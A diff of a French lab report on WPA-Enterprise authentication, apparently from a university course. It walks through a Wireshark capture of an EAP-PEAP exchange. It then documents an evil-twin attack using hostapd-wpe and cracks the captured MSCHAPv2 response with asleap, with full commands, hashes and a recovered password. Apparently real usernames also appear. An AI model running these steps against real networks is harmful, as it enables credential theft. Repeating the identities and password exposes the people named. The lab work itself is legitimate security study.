@@ -66,23 +66,171 @@ Pour réussir votre capture, vous pouvez procéder de la manière suivante :
 	- Authentification interne et transmission de la clé WPA (échange chiffré, vu par Wireshark comme « Application data »)
 	- 4-way handshake
 
+### Comparaison capture Wireshark et théorie
+
+Certaines captures d'écran ont été prise de la capture Wireshark que nous avons effectuée, malheureusement il manque certaines parties dans celle-ci (par exemple pour les méthode d'authentifications proposées nous n'avons pas de EAP-TLS mais directement du PEAP). C'est pourquoi nous avons aussi des captures d'écran venant de la capture Wireshark fournie.
+
+Il est a noter aussi que la communication se fait entre trois parties, du client ver l'AP et de l'AP ver le serveur d'authentification.
+
+#### Requête et réponse d’authentification système ouvert
+
+Les captures d'écrans de cette section sont prises depuis notre capture Wireshark.
+
+Voici la requête envoyée par le client :
+
+![auth_request](./img/open_auth_request.png)
+
+Nous pouvons voir dans l'en-tête IEEE 802.11 Wireless Management qu'il s'agit bien d'un système ouvert (champ `Authentication Algorithm`). Lorsqu'il s'agit d'une requête d'authentification le champ `Authentication SEQ` contient la valeur `0x0001`, il s'agit donc bien d'une trame allant d'un client vers l'AP.
+
+Voici la réponse de l'AP :
+
+![auth_response](./img/open_auth_response.png)
+
+Dans l'en-tête IEEE 802.11 Wireless Management nous pouvons voir cette fois-ci qu'il s'agit de la séquence numéro 2, il s'agit donc d'une réponse à une requête. La trame vient bien d'un AP en direction d'un client ayant fait une requête.
+
+#### Requête et réponse d’association (ou reassociation)
+
+Les captures d'écrans de cette section sont prises depuis notre capture Wireshark.
+
+Voici la requête envoyée par le client :
+
+![association_request](./img/association_request.png)
+
+Nous pouvons voir dans l'encadré rouge qu'il s'agit bien d'une requête d'association.
+Dans l'en-tête IEEE 802.11 Wireless Management on peut voir différents champs dont celui contenant le SSID de l'AP (ici `HEIG-VD`). Le reste des informations concernent les différentes propriétés que supporte le client (débit, channels, etc...).
+
+Voici la réponse envoyée par l'AP :
+
+![association_response](./img/association_response.png)
+
+Ici l'encadré rouge montre qu'il s'agit d'une réponse d'association. Dans l'en-tête IEEE 802.11 Wireless Management on peut voir le status code à `Successful`, ce qui nous montre que l'association a été réussie. Juste en dessous nous pouvons voir l'`Association ID` qui est un ID lié au client (ici `0x0002`). Le reste des paramètres sont les différentes propriétés supportées par l'AP.
+
+Nous pouvons noter que pour l'authentification et pour l'association le protocole utilisé est 802.11. Maintenant nous avons terminé la séquence du système ouvert. Nous allons passer à la négociation d'authentification entreprise.
+
+#### Négociation de la méthode d’authentification entreprise
+
+Pour cette partie nous avons eu quelques soucis avec notre capture Wireshark, en effet nous n'avons pas le même déroulement que dans la capture Wireshark d'exemple. Dans la capture d'exemple l'AP propose d'abord d'utiliser la méthode `EAP-TLS`, cette trame n'existe pas dans notre capture, il nous est directement proposé d'utiliser `EAP-PEAP`. C'est pourquoi les captures présentes dans cette section proviennent de la capture Wireshark d'exemple.
+
+Afin de faire la négociation d'authentification, l'AP va envoyer une trame en définissant la méthode qu'il souhaite utiliser. Le client aura la liberté d'accepter (en envoyant un `ACK`) ou alors de refuser (en envoyer un `NACK`) la méthode. Si le client refuse la méthode, l'AP proposera une autre méthode au client et on recommence le même processus.
+
+Voici la trame qu'envoie l'AP :
+
+![eap_TLS_negociation](./img/eap_TLS_negociation.PNG)
+
+Nous pouvons voir qu'ici l'AP fait une request au client pour lui proposer d'utiliser l'authentification `EAP-TLS`. On peut voir que la méthode proposée est encapsulée dans EAP (qui est 802.1X).
+
+Voici la trame qu'envoie le client :
+
+![eap_TLS_negociation_refuse](./img/eap_TLS_negociation_refuse.PNG)
+
+On peut voir que le client envoie un `Nak` car il refuse d'utiliser cette méthode. Il renseigne dans le champ `Desired Auth Type` la méthode d'authentification qu'il souhaite utiliser. Ici il s'agit de la méthode `EAP-PEAP`.
+
+Donc l'AP va ensuite envoyer une nouvelle trame avec la méthode demandée par le client :
+
+![eap_PEAP_negociation_refuse](./img/eap_PEAP_negociation.PNG)
+
+Les messages de la négociation utilisent tous le protocole EAP (802.11x).
+
+#### Phase d’initiation
+
+Les captures d'écrans de cette section sont prises depuis notre capture Wireshark.
+
+Dans la phase d'initiation, le client envoie dans un premier temps un paquet EAPOL `start` :
+
+![initiation_phase_start](./img/initiation_phase_start.PNG)
+
+Ce paquet va permettre d'initier le processus d'authentification. Ensuite l'AP va demander au client de déclarer son identité en utilisant un paquet `request` ayant comme type `Identity` :
+
+![initiation_phase_request_identity](./img/initiation_phase_request_identity.PNG)
+
+Puis le client va ensuite envoyer un paquet `Response` avec le type `Identity` :
+
+![initiation_phase_response_identity](./img/initiation_phase_response_identity.PNG)
+
+Nous pouvons voir dans ce paquet qu'une identité est fournie, ici il s'agit de `einet\olivier.tissotda`. Ensuite l'AP pourra communiquer avec un serveur d'authentification (RADIUS par exemple) afin de faire un Access-Request. La prochaine étape va être l'établissement d'un tunnel TLS.
+
+#### Phase hello TLS
+
+Afin de mettre en place le tunnel TLS, dans un premier temps, le client va envoyer une trame `hello` à l'AP, ce message sera transmis au serveur d'authentification.
+
+Voici à quoi ressemble la trame `Client Hello` :
+
+![TLS_hello_client](./img/TLS_hello_client.PNG)
+
+On peut voir qu'elle a une en-tête `EAP` de type `EAP-PEAP` et qu'elle comporte une partie `Transport Layer Security`.
+Voici le contenu de la partie `TLS` :
+
+![TLS_hello_client_content](./img/TLS_hello_client_content.PNG)
+
+Le serveur d'authentification va répondre au client avec un message TLS `Server Hello`. Ce message est envoyé en plusieurs fragments `EAP-PEAP`, cela est nécessaire car un message EAP à une taille limite et les certificats qui sont envoyés sont assez gros. Ce message est composé de différentes parties comme le `Server Hello`, le `Certificate`, le `Server Key Exchange` et le `Server Hello Done`.
+
+![TLS_hello_server](./img/TLS_hello_server.PNG)
+
+On peut voir en haut de la capture les différents paquets `EAP-PEAP` envoyés par le serveur d'authentification. Dans le paquet TLS finale on peut voir que 7 fragments ont été envoyé pour composer le `Server Hello`. Voici le contenu du message TLS envoyé par le serveur : 
+
+![TLS_hello_server_content](./img/TLS_hello_server_content.PNG)
+
+Nous pouvons maintenant identifier les différents champs demandés :
+
+- L'encadré vert présent sur les captures de contenu montre la version TLS utilisée, ici il s'agit de `TLS 1.2`
+
+- L'encadré bleu montre le champ `random` qui est le `nonce`, il est différent pour les deux messages
+
+- L'encadré rouge montre le cipher suite et la méthode de compression. Dans le message du client, 21 cipher suite sont proposés et une méthode de compression est proposée. Le serveur répond au client avec un unique cipher suite et une unique méthode de compression, les deux auront été sélectionné parmis la liste proposée par le client. Dans notre cas le cipher suite est `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384` et il n'y a pas de méthode de compression
+
+- L'encadré noir montre le champ `Session ID`. Il n'est pas présent chez le client dans notre capture mais uniquement dans la réponse du serveur. Il est possible par moment qu'il soit présent dans le dans le `Hello` du client (dans la capture fournie c'est le cas), car le serveur peut se rappeler des clés/algorithmes qui ont été utilisés par le passé avec ce client. (https://security.stackexchange.com/questions/188495/what-is-the-session-id-parameter-indicate-in-client-hello-and-server-hello-messa)
+
+#### Phase de transmission de certificats 
+
+Comme dit précédement la trame envoyée par le serveur contient différentes parties. Une des parties concerne la transmission des certificats :
+
+![TLS_hello_server_content_certificats](./img/TLS_hello_server_content_certificats.PNG)
+
+On peut voir que trois certificats sont envoyés au client. Le client répondra à cette trame avec un message `Client Key Exchange`, `Change Cipher Spec` et `Encrypted Hanshake message`. Ce message contient différentes informations, comme les paramètres pour le Diffie-Hellman.
+
+Ensuite il y a une partie liée au `Change cipher spec`, ce message est envoyé par le client (comme mentionné avant) et par le serveur d'authentification. Ce message permet de prévenir le client/le serveur que les prochains paquets seront protégés par les paramètres venant d'être négociés (clé et cipher suite).
+
+Voici le cipher change envoyé par le client :
+
+![TLS_client_cipher_change](./img/TLS_client_cipher_change.PNG)
+
+Et voici celui envoyé par le serveur :
+
+![TLS_server_cipher_change](./img/TLS_server_cipher_change.PNG)
+
+#### Authentification interne et transmission de la clé WPA
+
+Maintenant que la connexion est sécurisée via un tunnel TLS, on va refaire une authentification via EAP comme auparavant puis on va fournir la clé WPA (MSCHAPv2). Cependant comme nous sommes dans un tunnel TLS, il n'est plus possible de voir exactement ce qu'il se passe et wireshark va afficher ces échanges sous forme de `application data` :
+
+![WPA_key_exchange_EAP_auth](./img/WPA_key_exchange_EAP_auth.PNG)
+
+Nous pouvons voir dans les encadrés rouge les différents messages échangés dans le tunnel TLS.
+
+A la fin de la transmission TLS, un message `Success` est envoyé au client : 
+
+![WPA_EAP_auth_success](./img/WPA_EAP_auth_success.PNG)
+
+Après cela, il nous reste que la dernière étape qui concerne le 4-way handshake effectué entre le client et l'AP afin de finaliser le processus :
+
+![WPA_4_way_handshake](./img/WPA_4_way_handshake.PNG)
+
 ### Répondez aux questions suivantes :
  
 > **_Question :_** Quelle ou quelles méthode(s) d’authentification est/sont proposé(s) au client ?
 > 
-> **_Réponse :_** 
+> **_Réponse :_** Dans notre capture Wireshark, uniquement la méthode EAP-PEAP est proposée par l'AP mais dans la capture Wireshark d'exemple, dans un premier temps la méthode EAP-TLS est proposée puis la méthode EAP-PEAP est proposée au client.
 
 ---
 
 > **_Question:_** Quelle méthode d’authentification est finalement utilisée ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** La méthode EAP-PEAP est utilisée par le client dans les deux captures.
 
 ---
 
 > **_Question:_**Arrivez-vous à voir l’identité du client dans la phase d'initiation ? Oui ? Non ? Pourquoi ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** Oui nous pouvons voir l'identité du client durant cette phase. L'AP envoie une requête d'authentification et le client y répond avec un paquet response Identity qui contient le username du client. Dans notre capture il s'agit de `einet\olivier.tissotda`. On peut la lire car à ce moment de l'authentification, la communication n'est pas chiffrée (pas de tunnel TLS et pas de clé pour chiffrer les messages).
 
 ---
 
@@ -90,11 +238,11 @@ Pour réussir votre capture, vous pouvez procéder de la manière suivante :
 > 
 > - a. Le serveur envoie-t-il un certificat au client ? Pourquoi oui ou non ?
 > 
-> **_Réponse:_**
+> **_Réponse:_** Le serveur envoie trois certificats au client afin de prouver son identité au client. Cela permet d'éviter des attaques type `MITM`. 
 > 
 > - b. Le client envoie-t-il un certificat au serveur ? Pourquoi oui ou non ?
 > 
-> **_Réponse:_**
+> **_Réponse:_** Non, car la méthode d'authentification est EAP-PEAP. Cette méthode utilise les identifiants pour s'authentifier et ne requiert pas l'utilisation d'un certificat.
 > 
 
 ---
@@ -121,19 +269,72 @@ Pour implémenter l’attaque :
 
 > **_Question :_** Quelles modifications sont nécessaires dans la configuration de hostapd-wpe pour cette attaque ?
 > 
-> **_Réponse :_** 
+> **_Réponse :_** Les champs relatifs au 802.11 càd `ssid` et `channel` (les adapter au réseau que l'on souhaite imiter).
+
+Nous avons pris soin de créer un certificat plus approprié à l'aide de l'outil `apd_launchpad.py` :
+
+```
+python apd_launchpad.py -t HEIG-VD -s HEIG-XD -i wlan0 -cn HEIG.VD
+```
+voici à quoi le certificat ressemble sur le device se connectant :
+
+![](./img/IOS_Certif_HEIG.PNG)
+
+Vous trouverez tout les fichiers générés par l'outil [ici](./files/HEIG-VD/)
+
+Voici aussi l'output de la capture de hostapd-wpe :
+
+```bash
+
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.1X: Identity received from STA: 'einet/joachim.bailat'
+
+
+mschapv2: Wed May 24 08:02:14 2023
+         username:      einet/joachim.bailat
+         challenge:     00:8f:09:ce:08:f8:7f:c1
+         response:      c5:24:d3:41:51:cd:5c:05:b2:ad:e3:84:76:c3:e2:9a:79:ed:d5:c3:c5:ce:cf:26
+         jtr NETNTLM:           einet/joachim.bailat:$NETNTLM$008f09ce08f87fc1$c524d34151cd5c05b2ade38476c3e29a79edd5c3c5cecf26
+         hashcat NETNTLM:       einet/joachim.bailat::::c524d34151cd5c05b2ade38476c3e29a79edd5c3c5cecf26:008f09ce08f87fc1
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.1X: Identity received from STA: 'einet/joachim.bailat'
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.11: disassociated
+wlan0: STA 2e:e2:97:8d:d6:4f IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)
+
+```
+
 
 ---
 
 > **_Question:_** Quel type de hash doit-on indiquer à john ou l'outil que vous avez employé pour craquer le handshake ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** Dans notre cas nous avons fait usage de l'outil [asleap](https://www.kali.org/tools/asleap/) :
+
+```
+asleap -C 00:8f:09:ce:08:f8:7f:c1 -R c5:24:d3:41:51:cd:5c:05:b2:ad:e3:84:76:c3:e2:9a:79:ed:d5:c3:c5:ce:cf:26 -W /usr/share/wordlists/rockyou.txt 
+asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+Using wordlist mode with "/usr/share/wordlists/rockyou.txt".
+	hash bytes:       eff6
+	NT hash:          e24106942bf38bcf57a6a4b29016eff6
+	password:         buttercup
+
+```
+Cet outil prends le `challenge` -C et la `reponse` -R issus de la sortie de `hostapd-wpe` et une wordlist (rockyou.txt)
+
+Après quelques recherches, il semblerait que pour hashcat il faille utilisé l'argument -m 5500 correspondant au hashtype "5500	NetNTLMv1 / NetNTLMv1+ESS" [selon leur doc](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 ---
 
 > **_Question:_** Quelles méthodes d’authentification sont supportées par hostapd-wpe ?
 > 
-> **_Réponse:_**
+> **_Réponse:_** Selon la [doc fournit sur le repo](https://github.com/OpenSecurityResearch/hostapd-wpe) :
+
+Hostapd-wpe supporte :
+
+    1. EAP-FAST/MSCHAPv2 (Phase 0)
+    2. PEAP/MSCHAPv2
+    3. EAP-TTLS/MSCHAPv2
+    4. EAP-TTLS/MSCHAP
+    5. EAP-TTLS/CHAP
+    6. EAP-TTLS/PAP
 
 
 ### 3. En option, vous pouvez explorer d'autres outils comme [eapeak](https://github.com/rsmusllp/eapeak) ou [crEAP](https://github.com/W9HAX/crEAP/blob/master/crEAP.py) pour les garder dans votre arsenal de pentester.
